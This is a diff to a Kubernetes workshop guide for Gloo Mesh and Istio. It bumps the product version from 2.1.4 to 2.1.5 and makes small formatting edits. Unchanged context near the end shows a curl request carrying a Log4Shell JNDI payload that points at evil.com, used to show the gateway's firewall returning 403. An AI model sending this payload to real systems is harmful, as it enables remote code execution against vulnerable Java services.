@@ -122,7 +122,7 @@ metallb-system       speaker-d7jkp                                 1/1     Runni
 First of all, let's install the `meshctl` CLI:
 
 ```bash
-export GLOO_MESH_VERSION=v2.1.4
+export GLOO_MESH_VERSION=v2.1.5
 curl -sL https://run.solo.io/meshctl/install | sh -
 export PATH=$HOME/.gloo-mesh/bin:$PATH
 ```
@@ -166,7 +166,7 @@ helm repo update
 kubectl --context ${MGMT} create ns gloo-mesh 
 helm upgrade --install gloo-mesh-enterprise gloo-mesh-enterprise/gloo-mesh-enterprise \
 --namespace gloo-mesh --kube-context ${MGMT} \
---version=2.1.4 \
+--version=2.1.5 \
 --set glooMeshMgmtServer.ports.healthcheck=8091 \
 --set glooMeshUi.serviceType=LoadBalancer \
 --set mgmtClusterName=${MGMT} \
@@ -245,11 +245,12 @@ kubectl --context ${CLUSTER1} create ns bookinfo-frontends
 kubectl --context ${CLUSTER1} create ns bookinfo-backends
 kubectl --context ${CLUSTER1} label namespace bookinfo-frontends istio.io/rev=1-16
 kubectl --context ${CLUSTER1} label namespace bookinfo-backends istio.io/rev=1-16
+
 # deploy the frontend bookinfo service in the bookinfo-frontends namespace
 kubectl --context ${CLUSTER1} -n bookinfo-frontends apply -f bookinfo.yaml -l 'account in (productpage)'
 kubectl --context ${CLUSTER1} -n bookinfo-frontends apply -f bookinfo.yaml -l 'app in (productpage)'
-# deploy the backend bookinfo services in the bookinfo-backends namespace for all versions less than v3
 kubectl --context ${CLUSTER1} -n bookinfo-backends apply -f bookinfo.yaml -l 'account in (reviews,ratings,details)'
+# deploy the backend bookinfo services in the bookinfo-backends namespace for all versions less than v3
 kubectl --context ${CLUSTER1} -n bookinfo-backends apply -f bookinfo.yaml -l 'app in (reviews,ratings,details),version notin (v3)'
 # Update the productpage deployment to set the environment variables to define where the backend services are running
 kubectl --context ${CLUSTER1} -n bookinfo-frontends set env deploy/productpage-v1 DETAILS_HOSTNAME=details.bookinfo-backends.svc.cluster.local
@@ -258,6 +259,7 @@ kubectl --context ${CLUSTER1} -n bookinfo-frontends set env deploy/productpage-v
 kubectl --context ${CLUSTER1} -n bookinfo-backends set env deploy/reviews-v1 CLUSTER_NAME=${CLUSTER1}
 kubectl --context ${CLUSTER1} -n bookinfo-backends set env deploy/reviews-v2 CLUSTER_NAME=${CLUSTER1}
 ```
+
 
 <!--bash
 until [[ $(kubectl --context ${CLUSTER1} -n bookinfo-frontends get deploy -o json | jq '[.items[].status.readyReplicas] | add') -eq 1 ]]; do
@@ -477,7 +479,7 @@ helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
   --set glooMeshAgent.enabled=false \
   --set rate-limiter.enabled=true \
   --set ext-auth-service.enabled=true \
-  --version 2.1.4
+  --version 2.1.5
 ```
 Set the environment variable for the service corresponding to the Istio Ingress Gateway of the cluster(s):
 
@@ -1974,7 +1976,7 @@ curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://${ENDPOINT_HTTPS_GW
 
 The request should be rejected:
 
-```
+```,nocopy
 HTTP/2 403 
 content-length: 27
 content-type: text/plain
